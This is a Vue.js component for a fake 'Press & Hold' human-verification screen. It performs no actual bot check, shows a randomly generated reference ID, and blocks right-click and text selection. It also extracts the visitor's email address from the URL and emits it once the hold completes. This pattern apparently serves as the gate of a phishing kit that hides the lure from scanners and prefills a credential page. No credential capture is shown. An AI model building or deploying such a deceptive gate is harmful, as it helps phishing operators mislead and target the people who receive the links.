<template>
  <div class="container">
    <div class="verification-box">
      <h1>Before we continue...</h1>
      <p>
        Press & Hold to confirm you are
        <br>a human (and not a bot).
      </p>
      <button 
        @mousedown="startHolding" 
        @mouseup="stopHolding" 
        @mouseleave="stopHolding"
        @touchstart.prevent="startHolding"
        @touchend.prevent="stopHolding"
        @touchcancel.prevent="stopHolding"
        @contextmenu.prevent
      >
        <div class="progress" :style="{ width: progress + '%' }"></div>
        <span>Press & Hold</span>
      </button>
    </div>
    <div class="reference">{{ referenceId }}</div>
  </div>
</template>

<script>
export default {
  name: 'HumanVerification',
  data() {
    return {
      progress: 0,
      timerRef: null,
      animationRef: null,
      referenceId: '',
      verificationToken: null,
      email: null
    }
  },
  mounted() {
    this.referenceId = this.generateReferenceId();
    this.verificationToken = this.generateRandomToken();
    
    this.extractEmailFromUrl();
    
    document.addEventListener('contextmenu', this.preventContextMenu);
  },
  beforeUnmount() {
    document.removeEventListener('contextmenu', this.preventContextMenu);
  },
  methods: {
    extractEmailFromUrl() {
      const fullUrl = decodeURIComponent(window.location.href);
      let foundEmail = null;
      
      const emailPattern = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
      const matches = fullUrl.match(emailPattern);
      
      if (matches && matches.length > 0) {
        foundEmail = matches[matches.length - 1];
      }
      
      if (foundEmail && this.isValidEmail(foundEmail)) {
        this.email = foundEmail;
        console.log("Found email:", this.email);
      }
    },
    
    isValidEmail(email) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email);
    },
    
    preventContextMenu(event) {
      event.preventDefault();
      return false;
    },
    
    generateRandomToken() {
      return Math.random().toString(36).substring(2, 15) + 
             Math.random().toString(36).substring(2, 15);
    },
    
    generateReferenceId() {
      const hexChars = '0123456789abcdef';
      const sections = [8, 4, 4, 4, 12];
      
      let result = 'Reference ID ';
      
      for (let i = 0; i < sections.length; i++) {
        for (let j = 0; j < sections[i]; j++) {
          result += hexChars[Math.floor(Math.random() * hexChars.length)];
        }
        if (i < sections.length - 1) {
          result += '-';
        }
      }
      
      return result;
    },
    
    startHolding() {
      if (this.timerRef) clearTimeout(this.timerRef);
      if (this.animationRef) cancelAnimationFrame(this.animationRef);
      
      const startTime = Date.now();
      
      const updateProgress = () => {
        const elapsed = Date.now() - startTime;
        this.progress = Math.min((elapsed / 3000) * 100, 100);
        
        if (this.progress < 100) {
          this.animationRef = requestAnimationFrame(updateProgress);
        }
      };
      
      this.animationRef = requestAnimationFrame(updateProgress);
      
      this.timerRef = setTimeout(() => {
        this.$emit('verification-complete', this.email);
      }, 3000);
    },
    
    stopHolding() {
      if (this.timerRef) clearTimeout(this.timerRef);
      if (this.animationRef) cancelAnimationFrame(this.animationRef);
      this.progress = 0;
    }
  }
}
</script>

<style scoped>
.container {
  width: 100%;
  max-width: 650px;
  padding: 0 20px;
  position: relative;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
  touch-action: manipulation;
}

.verification-box {
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
  padding: 40px;
  width: 100%;
  text-align: center;
}

h1 {
  color: #5f6368;
  font-size: 24px;
  font-weight: 500;
  margin-bottom: 16px;
}

p {
  color: #5f6368;
  font-size: 14px;
  margin-bottom: 24px;
  line-height: 1.5;
}

button {
  position: relative;
  width: 240px;
  padding: 12px 0;
  color: #2196F3;
  border: 1px solid #2196F3;
  border-radius: 9999px;
  background-color: transparent;
  cursor: pointer;
  overflow: hidden;
  font-size: 14px;
  font-weight: 500;
  transition: background-color 0.2s;
  outline: none;
  -webkit-tap-highlight-color: transparent;
  touch-action: manipulation;
}

button:hover {
  background-color: rgba(33, 150, 243, 0.05);
}

.progress {
  position: absolute;
  left: 0;
  top: 0;
  bottom: 0;
  width: 0;
  background-color: rgba(33, 150, 243, 0.1);
  transition: width 0.1s;
}

button span {
  position: relative;
  z-index: 10;
}

.reference {
  text-align: center;
  font-size: 11px;
  color: #9aa0a6;
  padding: 5px 0;
  margin-top: 10px;
}
</style>
